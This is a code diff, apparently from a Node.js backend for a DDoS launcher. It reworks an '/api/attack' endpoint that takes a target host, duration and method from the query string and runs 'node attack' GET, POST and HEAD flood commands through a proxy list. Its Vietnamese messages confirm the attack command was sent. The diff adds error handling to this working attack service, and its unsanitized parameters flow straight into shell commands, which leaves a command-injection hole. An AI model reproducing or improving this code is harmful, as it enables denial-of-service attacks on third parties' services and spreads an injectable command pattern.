@@ -60,7 +60,7 @@ const executeAllAttacks = (methods, host, time) =>
     methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`)
         .forEach((command) => executeAttack(command, time));
 
-app.get("/api/attack", (req, res) => {
+app.get("/api/attack", async (req, res) => {
     const { key, host, time, method, port, modul } = req.query;
 
     if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
@@ -74,18 +74,29 @@ app.get("/api/attack", (req, res) => {
 
     activeAttacks++;
 
-    if (modul === "FULL") {
-        executeAllAttacks(["GET", "POST", "HEAD"], host, time);
+    try {
+        if (modul === "FULL") {
+            executeAllAttacks(["GET", "POST", "HEAD"], host, time);
+            res.json({
+                status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
+                host: host, port: port, time: time, modul: "GET POST HEAD", method: method, pid: currentPID,
+                serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
+            });
+        } else {
+            const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
+            executeAttack(command, time);
+            res.json({
+                status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI",
+                host: host, port: port, time: time, modul: modul, method: method, pid: currentPID,
+                serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
+            });
+        }
+    } catch (error) {
+        console.error("Lỗi khi thực hiện tấn công:", error.message);
         res.json({
-            status: "SUCCESS", message: "LỆNH ATTACK FULL (GET, POST, HEAD) ĐÃ GỬI",
-            host: host, port: port, time: time, modul: "GET POST HEAD", method: method, pid: currentPID
-        });
-    } else {
-        const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
-        executeAttack(command, time);
-        res.json({
-            status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI",
-            host: host, port: port, time: time, modul: modul, method: method, pid: currentPID
+            status: "ERROR",
+            message: "LỖI KHI THỰC HIỆN TẤN CÔNG",
+            serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
         });
     }
 });
